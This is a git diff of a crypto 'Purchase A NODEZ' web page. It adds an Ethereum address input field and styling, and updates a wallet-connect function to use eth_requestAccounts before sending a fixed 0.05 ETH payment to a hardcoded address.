@@ -28,13 +28,21 @@
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      height: 75vh; /* Adjust the height as needed */
+      height: 80vh;
       background: linear-gradient(135deg, #8e44ad, #c39bd3);
       color: white;
     }
     .content {
       text-align: center;
       padding: 20px;
+    }
+    .input-field {
+      margin-bottom: 20px;
+      width: 80%;
+      max-width: 300px;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
     }
     .btn-connect {
       padding: 10px 20px;
@@ -81,6 +89,7 @@
 <div class="container">
   <div class="content">
     <h1 class="ethreal-animation">Purchase A NODEZ of your Choice</h1>
+    <input type="text" id="recipientAddress" class="input-field" placeholder="Enter Ethereum address">
     <button onclick="connectWallet()" class="btn-connect">Connect Wallet</button>
   </div>
 </div>
@@ -98,7 +107,7 @@
   async function connectWallet() {
     if (window.ethereum) {
       try {
-        await window.ethereum.enable();
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
         const web3 = new Web3(window.ethereum);
         const recipientAddress = '0xD3B13a903a89a2DC280920B4EC10062a1003d576'; // The destination address
         const valueToSend = web3.utils.toWei('0.05', 'ether'); // Assuming sending 0.05 ETH
